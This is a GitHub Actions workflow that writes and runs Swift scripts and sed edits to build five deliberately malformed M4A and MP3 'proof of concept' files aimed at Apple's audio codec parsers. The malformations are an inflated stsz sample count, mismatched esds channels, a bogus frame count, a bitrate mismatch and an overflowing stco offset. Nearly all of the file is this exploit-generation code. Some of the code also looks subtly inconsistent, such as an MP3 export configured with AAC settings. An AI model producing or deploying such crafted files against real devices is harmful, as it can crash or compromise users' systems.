name: Generate PoC Audio Files

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build-and-generate:
    runs-on: macos-latest
    timeout-minutes: 30

    steps:
      # Clone the repository
      - name: Clone repository
        run: |
          echo "Cloning repository at $(date)"
          git clone https://github.com/encryptedcoderr/AppleTest/
          cd AppleTest/apple-positional-audio-codec-invalid-header-main
          echo "Listing directory contents at $(date)"
          ls -l
          echo "Repository cloned and directory listed at $(date)"

      # Cache FFmpeg
      - name: Cache FFmpeg
        uses: actions/cache@v4
        with:
          path: /usr/local/bin/ffmpeg
          key: ffmpeg-${{ runner.os }}-2025-06
          restore-keys: ffmpeg-${{ runner.os }}-

      # Install FFmpeg
      - name: Install FFmpeg
        run: |
          echo "Installing FFmpeg at $(date)"
          if ! command -v ffmpeg &> /dev/null; then
            brew install ffmpeg
          else
            echo "FFmpeg already installed"
          fi
          echo "FFmpeg installed at $(date)"

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '16.1'

      # Create generate_pocs.swift
      - name: Create generate_pocs.swift
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating generate_pocs.swift at $(date)"
          cat << 'EOF' > generate_pocs.swift
          import AVFoundation
          import Foundation
          import CoreMedia

          func generateBaseM4A(filename: String, duration: Double, channels: Int, sampleRate: Double) throws {
              let outputURL = URL(fileURLWithPath: filename)
              let format = AVAudioFormat(standardFormatWithSampleRate: sampleRate, channels: UInt32(channels))!
              let frameCount = UInt32(duration * sampleRate)
              let buffer = AVAudioPCMBuffer(pcmFormat: format, frameCapacity: frameCount)!
              buffer.frameLength = frameCount
              if let floatData = buffer.floatChannelData {
                  for channel in 0..<Int(format.channelCount) {
                      memset(floatData[channel], 0, Int(frameCount) * MemoryLayout<Float>.size)
                  }
              }
              let writer = try AVAssetWriter(outputURL: outputURL, fileType: .m4a)
              let settings: [String: Any] = [
                  AVFormatIDKey: kAudioFormatMPEG4AAC,
                  AVSampleRateKey: sampleRate,
                  AVNumberOfChannelsKey: channels,
                  AVEncoderBitRateKey: 128000
              ]
              let audioInput = AVAssetWriterInput(mediaType: .audio, outputSettings: settings)
              writer.add(audioInput)
              writer.startWriting()
              writer.startSession(atSourceTime: .zero)
              var formatDesc: CMAudioFormatDescription?
              let asbd = format.streamDescription
              CMAudioFormatDescriptionCreate(allocator: kCFAllocatorDefault,
                                            asbd: asbd,
                                            layoutSize: 0,
                                            layout: nil,
                                            magicCookieSize: 0,
                                            magicCookie: nil,
                                            extensions: nil,
                                            formatDescriptionOut: &formatDesc)
              var sampleBuffer: CMSampleBuffer?
              let blockBufferLength = Int(frameCount) * Int(format.channelCount) * MemoryLayout<Float>.size
              var blockBuffer: CMBlockBuffer?
              CMBlockBufferCreateWithMemoryBlock(allocator: kCFAllocatorDefault,
                                                memoryBlock: buffer.floatChannelData![0],
                                                blockLength: blockBufferLength,
                                                blockAllocator: kCFAllocatorNull,
                                                customBlockSource: nil,
                                                offsetToData: 0,
                                                dataLength: blockBufferLength,
                                                flags: 0,
                                                blockBufferOut: &blockBuffer)
              let timing = CMSampleTimingInfo(duration: CMTime(value: 1, timescale: Int32(sampleRate)),
                                             presentationTimeStamp: .zero,
                                             decodeTimeStamp: .invalid)
              CMSampleBufferCreate(allocator: kCFAllocatorDefault,
                                  dataBuffer: blockBuffer,
                                  dataReady: true,
                                  makeDataReadyCallback: nil,
                                  refcon: nil,
                                  formatDescription: formatDesc,
                                  sampleCount: CMItemCount(frameCount),
                                  sampleTimingEntryCount: 1,
                                  sampleTimingArray: [timing],
                                  sampleSizeEntryCount: 0,
                                  sampleSizeArray: nil,
                                  sampleBufferOut: &sampleBuffer)
              audioInput.append(sampleBuffer!)
              audioInput.markAsFinished()
              writer.finishWriting {
                  print("Generated \(filename)")
              }
              while writer.status == .writing {
                  Thread.sleep(forTimeInterval: 0.1)
              }
              if writer.status == .failed {
                  throw writer.error ?? NSError(domain: "AVAssetWriter", code: -1, userInfo: nil)
              }
          }

          func main() {
              let sampleRate = 44100.0
              let duration = 1.0
              let channels = 2
              for i in 1...5 {
                  let filename = "base_poc\(i).m4a"
                  do {
                      try generateBaseM4A(filename: filename, duration: duration, channels: channels, sampleRate: sampleRate)
                  } catch {
                      print("Error generating \(filename): \(error)")
                      exit(1)
                  }
              }
          }

          main()
          EOF
          ls -l generate_pocs.swift
          echo "generate_pocs.swift created at $(date)"

      # Create manipulate_pocs.swift
      - name: Create manipulate_pocs.swift
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating manipulate_pocs.swift at $(date)"
          cat << 'EOF' > manipulate_pocs.swift
          import Foundation
          import AVFoundation
          import CoreMedia

          class MP4AtomParser {
              var data: Data
              var position: Int = 0
              
              init(data: Data) {
                  self.data = data
              }
              
              func readUInt32() -> UInt32 {
                  guard position + 4 <= data.count else { return 0 }
                  let value = data[position..<position+4].withUnsafeBytes { $0.load(as: UInt32.self).bigEndian }
                  position += 4
                  return value
              }
              
              func readData(count: Int) -> Data {
                  guard position + count <= data.count else { return Data() }
                  let subdata = data[position..<position+count]
                  position += count
                  return subdata
              }
              
              func findAtom(_ name: String) -> (offset: Int, size: Int)? {
                  let nameData = name.data(using: .ascii)!
                  position = 0
                  while position < data.count {
                      let start = position
                      let size = Int(readUInt32())
                      let type = readData(count: 4)
                      if type == nameData {
                          return (offset: start, size: size)
                      }
                      position = start + (size == 0 ? data.count : size)
                  }
                  return nil
              }
              
              func replaceData(at offset: Int, with newData: Data) {
                  data.replaceSubrange(offset..<offset+newData.count, with: newData)
              }
          }

          func manipulatePoC1(inputURL: URL, outputURL: URL) throws {
              let data = try Data(contentsOf: inputURL)
              let parser = MP4AtomParser(data: data)
              
              guard let stsz = parser.findAtom("stsz") else {
                  throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stsz atom not found"])
              }
              
              let sampleCountOffset = stsz.offset + 8 + 4
              var newData = Data()
              newData.append(contentsOf: UInt32(8192).bigEndian.data)
              parser.replaceData(at: sampleCountOffset, with: newData)
              
              try parser.data.write(to: outputURL)
              print("PoC 1: Set stsz sample count to 8192 in \(outputURL.path)")
          }

          func manipulatePoC2(inputURL: URL, outputURL: URL) throws {
              let data = try Data(contentsOf: inputURL)
              let parser = MP4AtomParser(data: data)
              
              guard let esds = parser.findAtom("esds") else {
                  throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "esds atom not found"])
              }
              
              let channelOffset = esds.offset + 8 + 0x1B
              parser.replaceData(at: channelOffset, with: Data([8]))
              
              try parser.data.write(to: outputURL)
              print("PoC 2: Set esds channel count to 8 in \(outputURL.path)")
          }

          func manipulatePoC5(inputURL: URL, outputURL: URL) throws {
              let data = try Data(contentsOf: inputURL)
              let parser = MP4AtomParser(data: data)
              
              guard let stco = parser.findAtom("stco") else {
                  throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stco atom not found"])
              }
              
              let entryOffset = stco.offset + 8 + 4
              var newData = Data()
              newData.append(contentsOf: UInt32(0xFFFFFFFF).bigEndian.data)
              parser.replaceData(at: entryOffset, with: newData)
              
              try parser.data.write(to: outputURL)
              print("PoC 5: Set invalid stco offset in \(outputURL.path)")
          }

          func generateMP3(inputURL: URL, outputURL: URL, pocNumber: Int) throws {
              let asset = AVURLAsset(url: inputURL)
              guard let exportSession = AVAssetExportSession(asset: asset, presetName: AVAssetExportPresetAppleM4A) else {
                  throw NSError(domain: "AVAssetExportSession", code: -1, userInfo: [NSLocalizedDescriptionKey: "Failed to create export session"])
              }
              
              exportSession.outputURL = outputURL
              exportSession.outputFileType = .mp3
              exportSession.audioSettings = [
                  AVFormatIDKey: kAudioFormatMPEG4AAC,
                  AVSampleRateKey: 44100,
                  AVNumberOfChannelsKey: 1,
                  AVEncoderBitRateKey: pocNumber == 4 ? 320000 : 128000
              ]
              
              let semaphore = DispatchSemaphore(value: 0)
              exportSession.exportAsynchronously {
                  switch exportSession.status {
                  case .completed:
                      print("PoC \(pocNumber): Generated MP3 at \(outputURL.path)")
                      if pocNumber == 3 {
                          let ffmpegCmd = [
                              "ffmpeg", "-i", outputURL.path, "-c:a", "copy",
                              "-metadata", "frames=20000", "\(outputURL.path).tmp.mp3"
                          ]
                          let process = Process()
                          process.executableURL = URL(fileURLWithPath: "/usr/local/bin/ffmpeg")
                          process.arguments = ffmpegCmd
                          try? process.run()
                          process.waitUntilExit()
                          
                          try? FileManager.default.removeItem(at: outputURL)
                          try? FileManager.default.moveItem(at: URL(fileURLWithPath: "\(outputURL.path).tmp.mp3"), to: outputURL)
                          print("PoC 3: Added frames=20000 metadata to \(outputURL.path)")
                      }
                  case .failed:
                      print("PoC \(pocNumber) MP3 error: \(exportSession.error?.localizedDescription ?? "Unknown")")
                  default:
                      print("PoC \(pocNumber) MP3 export status: \(exportSession.status.rawValue)")
                  }
                  semaphore.signal()
              }
              semaphore.wait()
              
              if exportSession.status != .completed {
                  throw NSError(domain: "AVAssetExportSession", code: -1, userInfo: [NSLocalizedDescriptionKey: "MP3 export failed"])
              }
          }

          func main() {
              let fileManager = FileManager.default
              let sampleRate = 44100.0
              let channels = 2
              
              for i in 1...5 {
                  let inputFile = "base_poc\(i).m4a"
                  let outputM4A = "poc\(i).m4a"
                  let outputMP3 = "poc\(i).mp3"
                  
                  guard fileManager.fileExists(atPath: inputFile) else {
                      print("Error: \(inputFile) not found")
                      exit(1)
                  }
                  
                  let inputURL = URL(fileURLWithPath: inputFile)
                  let outputM4AURL = URL(fileURLWithPath: outputM4A)
                  let outputMP3URL = URL(fileURLWithPath: outputMP3)
                  
                  do {
                      switch i {
                      case 1:
                          try manipulatePoC1(inputURL: inputURL, outputURL: outputM4AURL)
                      case 2:
                          try manipulatePoC2(inputURL: inputURL, outputURL: outputM4AURL)
                      case 3, 4:
                          try fileManager.copyItem(at: inputURL, to: outputM4AURL)
                          print("Copied \(inputFile) to \(outputM4A) for PoC \(i)")
                      case 5:
                          try manipulatePoC5(inputURL: inputURL, outputURL: outputM4AURL)
                      default:
                          break
                      }
                      try generateMP3(inputURL: inputURL, outputURL: outputMP3URL, pocNumber: i)
                  } catch {
                      print("Error processing PoC \(i): \(error.localizedDescription)")
                      exit(1)
                  }
              }
          }

          extension UInt32 {
              var data: Data {
                  var value = self.bigEndian
                  return Data(bytes: &value, count: MemoryLayout<UInt32>.size)
              }
          }

          main()
          EOF
          ls -l manipulate_pocs.swift
          echo "manipulate_pocs.swift created at $(date)"

      # Create PoC source files
      - name: Create PoC source files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating PoC source files at $(date)"
          # PoC 1: Inflated Sample Count in stsz
          cp encodeme.mm encodeme_poc1.mm
          sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/8192/' encodeme_poc1.mm
          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float))/ s/44100 * channelNum * sizeof(float)/1024 * channelNum * sizeof(float)/' encodeme_poc1.mm
          
          # PoC 2: esds Channel Configuration Mismatch
          cp encodeme.mm encodeme_poc2.mm
          sed -i '' '/mChannelsPerFrame = channelNum/ s/channelNum/8/' encodeme_poc2.mm
          sed -i '' '/mNumberChannels = channelNum/ s/channelNum/1/' encodeme_poc2.mm
          sed -i '' '/kAudioChannelLayoutTag_Stereo/ s/Stereo/HOA_ACN_SN3D | 0x8/' encodeme_poc2.mm
          
          # PoC 3: Xing Header Frame Count Inflation
          cp encodeme.mm encodeme_poc3.mm
          sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/2000/' encodeme_poc3.mm
          
          # PoC 4: Frame Header Bitrate Mismatch
          cp encodeme.mm encodeme_poc4.mm
          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float))/ s/44100 * channelNum * sizeof(float)/(144000 \/ 1000 * 64 * channelNum)/' encodeme_poc4.mm
          
          # PoC 5: stco Offset Overflow
          cp encodeme.mm encodeme_poc5.mm
          sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/4096/' encodeme_poc5.mm
          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float))/ s/44100 * channelNum * sizeof(float)/100/' encodeme_poc5.mm
          
          ls -l encodeme_poc*.mm
          echo "PoC source files created at $(date)"

      # Generate base M4A files
      - name: Generate base M4A files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Generating base M4A files at $(date)"
          swift generate_pocs.swift
          ls -l base_poc*.m4a
          echo "Base M4A files generated at $(date)"

      # Manipulate M4A and generate MP3 files
      - name: Manipulate M4A and generate MP3 files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Manipulating M4A and generating MP3 files at $(date)"
          swift manipulate_pocs.swift
          ls -l poc*.m4a poc*.mp3
          echo "M4A and MP3 files generated at $(date)"

      # Verify generated files
      - name: Verify generated files
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Checking for generated files at $(date)"
          for poc in {1..5}; do
            for ext in m4a mp3; do
              if [ -f poc${poc}.${ext} ]; then
                FILE_SIZE=$(stat -f %z poc${poc}.${ext} 2>/dev/null || stat -c %s poc${poc}.${ext} 2>/dev/null)
                echo "poc${poc}.${ext} size: $FILE_SIZE bytes"
                if [ "$FILE_SIZE" -eq 0 ]; then
                  echo "Error: poc${poc}.${ext} is 0 bytes"
                  exit 1
                fi
                ffprobe -i poc${poc}.${ext} -show_format -show_streams -print_format json 2>/dev/null || echo "ffprobe failed for poc${poc}.${ext}"
              else
                echo "poc${poc}.${ext} not found"
                exit 1
              fi
            done
          done
          echo "Generated files verified at $(date)"

      # Upload artifacts
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: poc-audio-files
          path: |
            AppleTest/apple-positional-audio-codec-invalid-header-main/poc*.m4a
            AppleTest/apple-positional-audio-codec-invalid-header-main/poc*.mp3
            AppleTest/apple-positional-audio-codec-invalid-header-main/encodeme_poc*.mm
          retention-days: 7
          if-no-files-found: error
